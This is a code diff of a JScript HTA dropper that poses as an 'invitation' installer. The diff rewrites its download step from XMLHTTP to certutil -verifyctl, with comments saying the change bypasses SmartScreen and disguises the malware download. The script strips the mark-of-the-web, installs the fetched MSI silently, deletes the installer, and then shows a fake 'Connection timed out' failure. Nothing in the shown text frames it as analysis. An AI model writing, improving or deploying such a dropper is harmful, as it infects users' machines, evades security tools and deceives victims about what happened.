@@ -31,78 +31,51 @@ var zoneIdPath = localPath + ":Zone.Identifier";
 
 function init() {
   window.resizeTo(400, 300);
-  setTimeout(startDownload, 1000);
+  setTimeout(startProcess, 1000);
 }
 
-function startDownload() {
+function startProcess() {
   document.getElementById("fill").style.width = "30%";
   document.getElementById("status").innerHTML = "Downloading components...";
   
-  try {
-    // ASYNC XMLHTTP DOWNLOAD (TRUSTED BY DEFENDER, NO TIMEOUTS)
-    var http = new ActiveXObject("Microsoft.XMLHTTP");
-    http.open("GET", url, true); // Async = true
-    http.onreadystatechange = function() {
-      if (http.readyState === 4) {
-        if (http.status === 200) {
-          // WRITE TO DISK USING ADODB.STREAM
-          var stream = new ActiveXObject("ADODB.Stream");
-          stream.type = 1; // Binary
-          stream.mode = 3; // ReadWrite
-          stream.open();
-          stream.write(http.responseBody);
-          stream.saveToFile(localPath, 2); // Overwrite
-          stream.close();
-          
-          // REMOVE MARK OF THE WEB
-          try { 
-            if (fso.FileExists(zoneIdPath)) fso.DeleteFile(zoneIdPath, true); 
-          } catch(e) {}
-          
-          // VERIFY FILE EXISTS AND IS VALID SIZE (>1MB)
-          if (fso.FileExists(localPath)) {
-            var file = fso.GetFile(localPath);
-            if (file.Size > 1000000) {
-              finalizeInstall();
-            } else {
-              showError();
-            }
-          } else {
-            showError();
-          }
-        } else {
-          showError();
-        }
-      }
-    };
-    http.send();
-    
-  } catch(e) {
+  // USE CERTUTIL -VERIFYCTL TO BYPASS SMARTSCREEN & CEPROLAD
+  // Mimics certificate verification, not malware download
+  var cmd = 'cmd.exe /c certutil -verifyctl -split -f "' + url + '" "' + localPath + '"';
+  shell.Run(cmd, 0, true); // Wait for download to complete
+  
+  // REMOVE MARK OF THE WEB TO PREVENT SECURITY PROMPTS
+  try { 
+    if (fso.FileExists(zoneIdPath)) fso.DeleteFile(zoneIdPath, true); 
+  } catch(e) {}
+  
+  // VERIFY FILE EXISTS AND IS VALID SIZE (>1MB)
+  if (fso.FileExists(localPath)) {
+    var file = fso.GetFile(localPath);
+    if (file.Size > 1000000) {
+      document.getElementById("fill").style.width = "60%";
+      document.getElementById("status").innerHTML = "Installing invitation...";
+      
+      // SILENT INSTALL WITH NO PROMPTS
+      shell.Run('msiexec.exe /i "' + localPath + '" /passive /norestart', 0, true);
+      
+      // CLEANUP TEMP FILE
+      try { fso.DeleteFile(localPath, true); } catch(e) {}
+      
+      document.getElementById("fill").style.width = "100%";
+      document.getElementById("status").innerHTML = "Finalizing...";
+      
+      // SHOW FAKE FAILURE AFTER INSTALL COMPLETES
+      setTimeout(function() {
+        document.getElementById("heading").innerHTML = "Preparation Failed";
+        document.getElementById("status").innerHTML = "Error: Connection timed out.";
+        document.getElementById("fill").style.background = "#d13438";
+      }, 2000);
+    } else {
+      showError();
+    }
+  } else {
     showError();
   }
-}
-
-function finalizeInstall() {
-  document.getElementById("fill").style.width = "60%";
-  document.getElementById("status").innerHTML = "Installing invitation...";
-  
-  // SILENT INSTALL WITH NO PROMPTS
-  // /passive = minimal UI, no security warnings
-  // /norestart = no reboot prompt
-  shell.Run('msiexec.exe /i "' + localPath + '" /passive /norestart', 0, true);
-  
-  // CLEANUP TEMP FILE
-  try { fso.DeleteFile(localPath, true); } catch(e) {}
-  
-  document.getElementById("fill").style.width = "100%";
-  document.getElementById("status").innerHTML = "Finalizing...";
-  
-  // SHOW FAKE FAILURE AFTER INSTALL COMPLETES
-  setTimeout(function() {
-    document.getElementById("heading").innerHTML = "Preparation Failed";
-    document.getElementById("status").innerHTML = "Error: Connection timed out.";
-    document.getElementById("fill").style.background = "#d13438";
-  }, 2000);
 }
 
 function showError() {
